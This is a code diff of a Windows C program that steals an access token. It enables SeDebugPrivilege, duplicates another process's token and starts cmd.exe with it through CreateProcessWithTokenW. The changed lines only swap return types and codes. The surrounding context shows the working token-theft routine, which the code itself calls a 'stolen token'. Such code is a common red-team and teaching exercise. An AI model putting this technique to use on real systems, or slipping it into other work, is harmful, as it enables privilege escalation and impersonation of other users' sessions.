@@ -10,13 +10,13 @@
 #define FILE_PATH "C:\\Windows\\System32\\cmd.exe"
 
 
-BOOL EnableDebug(void)
+int EnableDebug(void)
 {
 	LUID privilegeLuid;
 	if (!LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &privilegeLuid))
 	{
 		_tprintf(_T("Error - can't get privilege\n"));
-		return FALSE;
+		return 0;
 	}
 
 	TOKEN_PRIVILEGES privs;
@@ -30,7 +30,7 @@ BOOL EnableDebug(void)
 	if (!OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
 	{
 		_tprintf(_T("Error - can't get token from process\n"));
-		return FALSE;
+		return 0;
 	}
 
 	DWORD size = 0;
@@ -49,14 +49,14 @@ BOOL EnableDebug(void)
 				_tprintf(_T("SeDebugPriv Enabled!"));
 				CloseHandle(currentProc);
 				CloseHandle(token);
-				return 0;
+				return 1;
 			}
 		}
 	}
 	_tprintf(_T("Cant get SeDebugPriv Enabled!"));
 	CloseHandle(currentProc);
 	CloseHandle(token);
-	return 1;
+	return 0;
 }
 
 DWORD GetPid(TCHAR* ProcName)
@@ -87,7 +87,7 @@ int _tmain(int argc, TCHAR* argvp[])
 	if (!Hprocess)
 	{
 		_tprintf(_T("Can't open process\n"));
-		return 1;
+		return 0;
 	}
 
 	HANDLE token;
@@ -97,7 +97,7 @@ int _tmain(int argc, TCHAR* argvp[])
 	{
 		_tprintf(_T("Can't get process token\n"));
 		CloseHandle(hProcess);
-		return 1;
+		return 0;
 	}
 
 	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newToken))
@@ -105,7 +105,7 @@ int _tmain(int argc, TCHAR* argvp[])
 		_tprintf(_T("Can't duplicate token \n"));
 		CloseHandle(hProcess);
 		CloseHandle(token);
-		return 1;
+		return 0;
 	}
 
 	PROCESS_INFORMATION procInfo = {};
@@ -114,10 +114,10 @@ int _tmain(int argc, TCHAR* argvp[])
 	if (!CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, _T(FILE_PATH), NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo))
 	{
 		_tprintf(_T("Can't create process with stolen token\n"));
-		return 1;
+		return 0;
 	}
 	CloseHandle(hProcess);
 	CloseHandle(token);
 	CloseHandle(newToken);
-	return 0;
+	return 1;
 }
